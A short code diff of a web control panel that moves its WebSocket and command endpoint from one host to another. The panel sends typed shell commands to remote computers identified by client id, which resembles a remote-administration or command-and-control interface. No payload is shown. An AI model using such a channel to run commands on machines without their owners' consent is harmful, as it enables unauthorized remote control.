@@ -552,7 +552,7 @@ function openComputerControl(computer) {
       </div>
 
       <script>
-        const wss = new WebSocket("wss://hihat.onrender.com");
+        const wss = new WebSocket("wss://hihat.squareweb.app");
 
         wss.onopen = () => {
           wss.send(JSON.stringify({ role: "panel" }));
@@ -579,7 +579,7 @@ function openComputerControl(computer) {
 
           output.innerHTML += '<div style="color: #fff;">$ ' + command + '</div>';
 
-          fetch('https://hihat.onrender.com/set_command', {
+          fetch('https://hihat.squareweb.app/set_command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ command, clientId: ${JSON.stringify(computer.id)} })
@@ -661,7 +661,7 @@ function updateTime() {
 
 
 function initializeWebSocket() {
-  const socket = new WebSocket("wss://hihat.onrender.com");
+  const socket = new WebSocket("wss://hihat.squareweb.app");
 
   socket.onopen = () => {
     socket.send(JSON.stringify({ role: "panel" }));
